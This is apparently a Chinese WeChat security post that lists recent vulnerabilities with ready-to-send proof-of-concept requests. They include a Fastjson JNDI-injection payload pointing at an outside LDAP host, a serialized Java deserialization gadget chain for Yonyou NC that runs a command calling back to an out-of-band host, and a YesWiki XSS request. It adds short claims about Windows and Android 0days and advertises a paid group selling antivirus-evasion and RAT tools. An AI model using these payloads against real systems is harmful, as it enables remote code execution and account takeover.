#  近期0day+POC|Windows RCE 0day漏洞利用|最后一个宣称通杀Android12–16  
原创 渗透测试
                    渗透测试  渗透测试   2026-01-19 10:01  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/z3TOtprWtZ9XvRj6K0aXibj8JbVQia0TOZTHGxt2YnrSwgbNjLibribHibdH3ia3VUmkSu9ibvj7FZoP31FwezSuCDDhQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=d3ftoiiz&watermark=1&tp=wxpic#imgIndex=0 "")  
  
**点击上方蓝字****关注【渗透测试】不迷路**  
  
  
**免责声明**  
：本文所涉及的技术、工具及方法仅限用于合法授权的学习、研究目的。使用者应知悉并同意，任何滥用行为所引发的一切后果均由其自行承担，本公众号概不负责。  
  
  
1、天*绿盾审批系统 editConfigVal 接口 Fastjson 反序列化远程代码执行  
  
描述：  
  
**Fastjson 反序列化漏洞：Fastjson 是一个高效的 Java JSON 库。在特定版本中，为了提供灵活性，它支持在反序列化过程中通过**@type  
 属性指定任意可用的 Java 类。攻击者可以构造一个恶意的 JSON 字符串，其中 @type  
 指向一个包含危险方法（如  
构造函数、getter/setter）的类（例如 com.sun.rowset.JdbcRowSetImpl  
）。  
  
**利用链：当 Fastjson 反序列化这个恶意 JSON 时，会实例化指定的类并执行其一系列的 setter 或 getter 方法。通过精心构造的利用链（如 JNDI 注入），攻击者可以诱使应用程序连接到恶意的 LDAP/RMI 服务器，并加载执行远程的恶意 Java 代码。**  
  
**接口：**editConfigVal  
 接口通常用于修改系统配置值。如果该接口接收 JSON 格式的参数，并且直接使用存在漏洞的 Fastjson 版本进行反序列化，而没有做任何安全过滤，那么攻击者向这个接口发送恶意构造的 JSON 数据包，就可以触发漏洞。  
  
POC：  
```
POST /trwfe/login.jsp/.%2e/rest/conf/editConfigVal HTTP/1.1
Host: 
Content-Type: application/json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://gobygo.net/A4",
    "autoCommit": true
}
```  
  
2、*  
友NC UserSynchronizationServlet 反序列化漏洞  
  
POC：  
```
POST /servlet/UserSynchronizationServlet?pageId=login HTTP/1.1
Host: 
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 1355
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
X-Originating-Ip: [REDACTED]
X-Remote-Addr: [REDACTED]
X-Remote-Ip: [REDACTED]

��srjava.util.HashSet�D�����4xpw?@sr4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9��LkeytLjava/lang/Object;LmaptLjava/util/Map;xpt&https://github.com/joaomatosf/jexboss sr*org.apache.commons.collections.map.LazyMapn唂�y�Lfactoryt,Lorg/apache/commons/collections/Transformer;xpsr:org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z�[
iTransformerst-[Lorg/apache/commons/collections/Transformer;xpur-[Lorg.apache.commons.collections.Transformer;�V*��4�xpsr;org.apache.commons.collections.functors.ConstantTransformerXv�A��L	iConstantq~xpvrjava.lang.Runtimexpsr:org.apache.commons.collections.functors.InvokerTransformer���k{|�8[iArgst[Ljava/lang/Object;LiMethodNametLjava/lang/String;[iParamTypest[Ljava/lang/Class;xpur[Ljava.lang.Object;��X�s)lxpt
getRuntimeur[Ljava.lang.Class;�׮��Z�xpt	getMethoduq~vrjava.lang.String���8z;�Bxpvq~sq~uq~puq~tinvokeuq~vrjava.lang.Objectxpvq~sq~ur[Ljava.lang.String;��V��{Gxpt/ping d3i6c3plt95kfs63s15gp7ihb7adw9xu1.oast.protexecuq~q~ sq~srjava.lang.Integer⠤���8Ivaluexrjava.lang.Number������xpsrjava.util.HashMap���`�F
loadFactorI	thresholdxp?@wxxx
```  
  
3、CVE-2025-46549: YesWiki <= 4.5.1 - Cross-Site Scripting  
  
描述：YesWiki 4.5.1 及更早版本中存在反射型跨站脚本漏洞，该漏洞源于对用户输入的数据净化不足。攻击者可诱骗用户点击恶意链接，从而窃取其Cookie并劫持会话。  
  
POC：  
```
GET /?BazaR/bazariframe&id=2&template=%3cscript%3ealert(document.domain)%3c%2fscript%3e HTTP/1.1
Host: {{Hostname}}
```  
  
4、  
Cal.com /api/auth/session 权限绕过漏洞（CVE-2026-23478）  
```
在 Cal.com 3.1.6 至 6.0.7 版本中，其自定义 NextAuth JWT 回调逻辑存在身份认证绕过漏洞。攻击者可通过调用 
session.update() 方法并构造目标用户的邮箱地址，直接获取该用户的完整登录会话权限，进而实现账户接管。
```  
  
5、  
Windows RCE 0day漏洞利用  
```
✅漏洞类型：SMBGhost（SMBv3 远程代码执行）
⭕️ 利用方式：零点击（ZeroClick）
👉 可通过公网IP远程执行，无需用户交互、影响最新版Windows系统、攻击者可获得系统级完全控制权限
✅已测试系统：Windows 10、11Windows Server 2019、2022、2025
```  
  
  
该视频信息源自公开网络渠道。  
  
6、  
Android 0day漏洞+POC演示  
  
2026年1月16日，暗网监测发现一条涉及Android 0day漏洞及完整漏洞利用链的售卖信息，最初出现在Telegram的某个频道中。随后，相关内容被迅速转发至多个地下技术论坛及其他Telegram渠道，并附带一段漏洞利用的概念验证（PoC）演示视频，用以佐证其宣称的攻击能力。其中，完整的Android漏洞利用源代码标价高达450万美元；单独出售的漏洞利用shellcode标价为40万美元，堪称天价。此外，攻击者还提供目标植入服务，其定价亦相当高昂。  
  
  
该视频信息源自公开网络渠道。  
## ✅使用反馈  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/z3TOtprWtZicsu6bga7V3SVVpfUvMe0icicRicV8sMPBiabWmLv0Q2wxRO2AKZ92SGp9iaxchXV0dEezpVwWrplNdaaA/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=11 "")  
  
🎁获取方式(  
加入付费**星球**  
)  
  
客服支持 💬：24小时在线解答，不怕有问题！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/z3TOtprWtZicsu6bga7V3SVVpfUvMe0icic7laUSiafwjAaoHRlayORicV5bs3S5RbiblsjamEPR6icUxv5RJgiaWJK4MA/640?wx_fmt=jpeg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=12 "")  
  
💎  
**终身使用权**  
：购买即可获得星球所有工具的永久使用权，终身使用所有工具及未来升级版本。  
  
🖥️   
**多设备支持**  
：所有工具采用一机一码授权，支持多台自用电脑激活，灵活无忧。  
  
🏆  
**一次购买，终身受益！**  
享受无忧售后服务、技术支持与永久更新  
  
**星球介绍**  
  
**自研工具、二开工具、免杀工具、漏洞复现、教程等资源、漏洞挖掘分析、网络安全相关资料分享。**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/z3TOtprWtZicsu6bga7V3SVVpfUvMe0icic9utQNK68BavpsicGLbKypW1RAvhMZjIgibg6Sy11sKCow5mfK2OjEK0A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
  
[【免杀C2工具】PC端跨平台远程管理 ShadowRAT分析 | 汉化版附下载](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486800&idx=1&sn=5575c245c41427bf99f33c7e54d5ea67&scene=21#wechat_redirect)  
  
  
[【Ai渗透神器】AiScan‑N Ai自动渗透测试 | 助力CTF网络安全大赛，开启智能防护新篇章](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486744&idx=1&sn=8a247f091498ada202e8b5ad987f3f14&scene=21#wechat_redirect)  
  
  
[本地离线大模型DeepSeek‑R‑14B&Qwen3+ AiScan‑N助力CTF网络安全大赛|内网快速扫描，无需访问互联网！](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486742&idx=1&sn=18de251b3bb1792abff297d4a38d6eb8&scene=21#wechat_redirect)  
  
  
[用Ai做自动化渗透测试对CTF题目进行解密|CTF网络安全大赛](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486619&idx=1&sn=21e0ee188906bad707c3fc6bc15d2785&scene=21#wechat_redirect)  
  
  
[【神兵利器】Ai全自动化渗透测试工具 | AiScan-N带你开启智能安全的新时代！](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486594&idx=1&sn=ad542da6bc27d132bce6006e3b61805a&scene=21#wechat_redirect)  
  
  
[社工裤子 | 美国佬天塌了~](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486539&idx=1&sn=6a6b63aef63721ba84d3aaf86763d525&scene=21#wechat_redirect)  
  
  
[AiScan-N 不止于此！一款基于人工智能驱动的Ai自动化网络安全（运维）工具【CLI Agent】](https://mp.weixin.qq.com/s?__biz=Mzg2ODY3NDYxNA==&mid=2247486777&idx=1&sn=d8f140a775224b8d14e050804500f98f&scene=21#wechat_redirect)  
  
  
